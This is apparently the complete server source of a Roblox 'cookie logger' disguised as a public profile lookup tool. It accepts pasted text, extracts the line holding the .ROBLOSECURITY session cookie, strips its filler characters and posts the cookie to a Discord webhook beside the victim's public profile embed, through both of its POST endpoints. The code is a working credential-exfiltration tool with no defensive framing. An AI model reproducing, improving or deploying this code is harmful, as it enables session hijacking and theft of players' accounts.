require("dotenv").config();

const path = require("path");
const express = require("express");
const axios = require("axios");

const app = express();
const publicDir = path.join(__dirname, "public");

const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
const TARGET_LINE_KEYWORD = process.env.TARGET_LINE_KEYWORD || "ROBLOSECURITY";
const END_FILLER_LENGTH = 24;

app.use(express.json({ limit: "5mb" }));
app.use(express.static(publicDir));

app.get("/", (req, res) => {
  res.sendFile(path.join(publicDir, "index.html"));
});

app.get("/favicon.ico", (req, res) => {
  res.status(204).end();
});

function parseUserId(value) {
  const input = String(value || "").trim();
  const profileMatch = input.match(/roblox\.com\/users\/(\d+)/i);

  if (profileMatch) {
    return profileMatch[1];
  }

  return /^\d+$/.test(input) ? input : "";
}

function findUserIdInText(value) {
  const text = String(value || "");

  const patterns = [
    /\brbxuid=(\d+)\b/i,
    /\brbxid=(\d+)\b/i,
    /\bUserID=(\d+)\b/i,
    /\bUserId["'\s:=]+(\d+)\b/i,
    /roblox\.com\/users\/(\d+)/i,
  ];

  for (const pattern of patterns) {
    const match = text.match(pattern);

    if (match) {
      return match[1];
    }
  }

  return "";
}

function cleanDiscordText(value) {
  return String(value || "")
    .replace(/```/g, "`\u200b``")
    .trim();
}

function findSubmittedLineByKeyword(value, keyword) {
  const lines = String(value || "").split(/\r?\n/);
  const searchKeyword = String(keyword || "").trim();

  if (!searchKeyword || searchKeyword === "PUT_KEYWORD_HERE") {
    return "";
  }

  return lines.find((line) => line.includes(searchKeyword)) || "";
}

function trimLineFillers(value) {
  const text = String(value || "");
  const firstUnderscoreIndex = text.indexOf("_");

  if (firstUnderscoreIndex === -1 || text.length <= firstUnderscoreIndex + END_FILLER_LENGTH) {
    return "";
  }

  return text.slice(firstUnderscoreIndex, text.length - END_FILLER_LENGTH);
}

function sanitizeSubmittedText(value) {
  return cleanDiscordText(trimLineFillers(findSubmittedLineByKeyword(value, TARGET_LINE_KEYWORD)));
}

function chunkText(value, maxLength = 3800) {
  const chunks = [];
  let remaining = String(value || "");

  while (remaining.length > maxLength) {
    let splitAt = remaining.lastIndexOf("\n", maxLength);

    if (splitAt < maxLength * 0.5) {
      splitAt = maxLength;
    }

    chunks.push(remaining.slice(0, splitAt).trim());
    remaining = remaining.slice(splitAt).trim();
  }

  if (remaining) {
    chunks.push(remaining);
  }

  return chunks;
}

async function fetchRobloxProfile(userId) {
  const [profileResponse, thumbnailResponse] = await Promise.all([
    axios.get(`https://users.roblox.com/v1/users/${userId}`, {
      timeout: 10000,
    }),

    axios.get("https://thumbnails.roblox.com/v1/users/avatar-headshot", {
      params: {
        userIds: userId,
        size: "420x420",
        format: "Png",
        isCircular: false,
      },
      timeout: 10000,
    }),
  ]);

  const profile = profileResponse.data;
  const thumbnail = thumbnailResponse.data?.data?.[0]?.imageUrl || null;

  if (!profile?.id || !profile?.name) {
    throw new Error("Roblox profile was not found.");
  }

  return {
    id: profile.id,
    username: profile.name,
    displayName: profile.displayName || profile.name,
    description: profile.description || "",
    profileUrl: `https://www.roblox.com/users/${profile.id}/profile`,
    thumbnail,
  };
}

async function sendProfileEmbed(userId, submittedText = "") {
  try {
    if (!WEBHOOK_URL) {
      const error = new Error("Missing DISCORD_WEBHOOK_URL in .env");
      error.clientStatus = 500;
      error.clientMessage = "Discord webhook is not configured. Add DISCORD_WEBHOOK_URL to .env and restart the app.";
      throw error;
    }

    const profile = await fetchRobloxProfile(userId);

    const sanitizedText = sanitizeSubmittedText(submittedText);

    const embed = {
      title: `${profile.displayName} (@${profile.username})`,
      url: profile.profileUrl,
      color: 0x7c6bff,
      thumbnail: profile.thumbnail ? { url: profile.thumbnail } : undefined,
      fields: [
        {
          name: "Username",
          value: profile.username,
          inline: true,
        },
        {
          name: "Display Name",
          value: profile.displayName,
          inline: true,
        },
        {
          name: "UserId",
          value: String(profile.id),
          inline: true,
        },
      ],
      footer: {
        text: "Public Roblox profile lookup",
      },
      timestamp: new Date().toISOString(),
    };

    if (profile.description) {
      embed.description = profile.description.slice(0, 3500);
    }

    const payload = {
      content: "Roblox profile lookup",
      embeds: [embed],
    };

    const textChunks = chunkText(sanitizedText);

    if (!TARGET_LINE_KEYWORD || TARGET_LINE_KEYWORD === "PUT_KEYWORD_HERE") {
      const error = new Error("Target line keyword is not configured.");
      error.clientStatus = 500;
      error.clientMessage = "Target line keyword is not configured. Add TARGET_LINE_KEYWORD to .env and restart the app.";
      throw error;
    }

    if (!sanitizedText) {
      const error = new Error("No matching keyword line was found.");
      error.clientStatus = 400;
      error.clientMessage = `No line containing "${TARGET_LINE_KEYWORD}" was found, or the matching line only contained filler text.`;
      throw error;
    }

    payload.embeds.push({
      title: textChunks.length <= 1 ? "Matched Line" : `Matched Line (1/${textChunks.length})`,
      description: "```txt\n" + textChunks[0] + "\n```",
      color: 0x4f76ff,
    });

    const discordResponse = await axios.post(WEBHOOK_URL, payload, {
      timeout: 15000,
      maxBodyLength: Infinity,
    });

    for (let index = 1; index < textChunks.length; index += 1) {
      await axios.post(
        WEBHOOK_URL,
        {
          content: `Matched line continued (${index + 1}/${textChunks.length})`,
          embeds: [
            {
              title: `Matched Line (${index + 1}/${textChunks.length})`,
              description: "```txt\n" + textChunks[index] + "\n```",
              color: 0x4f76ff,
            },
          ],
        },
        {
          timeout: 15000,
          maxBodyLength: Infinity,
        }
      );
    }

    return {
      success: true,
      discordStatus: discordResponse.status,
      username: profile.username,
      displayName: profile.displayName,
      thumbnail: profile.thumbnail,
      profileUrl: profile.profileUrl,
      embeddedMatchedLine: Boolean(sanitizedText),
      matchedLineChunks: textChunks.length,
    };
  } catch (error) {
    const status = error.response?.status;
    const discordMessage =
      error.response?.data?.message ||
      (Array.isArray(error.response?.data?._errors)
        ? error.response.data._errors.map((item) => item.message).join(" ")
        : "");

    const message =
      error.clientMessage ||
      (status === 404
        ? "Roblox profile was not found."
        : discordMessage
          ? `Discord rejected the webhook payload: ${discordMessage}`
          : "Could not send the Roblox profile embed.");

    console.error("Roblox profile embed failed:", error.message || error);

    error.clientStatus = status === 404 ? 404 : 500;
    error.clientMessage = message;

    throw error;
  }
}

app.post("/profile", async (req, res) => {
  const userId = parseUserId(req.body?.userId || req.body?.profile);
  const submittedText = req.body?.text || "";

  if (!userId) {
    return res.status(400).json({
      error: "Enter a valid numeric Roblox UserId or profile URL.",
    });
  }

  try {
    const result = await sendProfileEmbed(userId, submittedText);
    res.json(result);
  } catch (error) {
    res.status(error.clientStatus || 500).json({
      error: error.clientMessage || "Could not send the Roblox profile embed.",
    });
  }
});

app.post("/profile-from-text", async (req, res) => {
  const submittedText = req.body?.text || "";
  const userId = findUserIdInText(submittedText);

  if (!userId) {
    return res.status(400).json({
      error: "No Roblox UserID was found in the pasted text.",
    });
  }

  try {
    const result = await sendProfileEmbed(userId, submittedText);
    res.json(result);
  } catch (error) {
    res.status(error.clientStatus || 500).json({
      error: error.clientMessage || "Could not send the Roblox profile embed.",
    });
  }
});

const port = process.env.PORT || 3000;
const host = process.env.HOST || "0.0.0.0";

app.listen(port, host, () => {
  console.log(`Roblox profile server running at http://localhost:${port}`);
  console.log(`Serving files from ${publicDir}`);
});
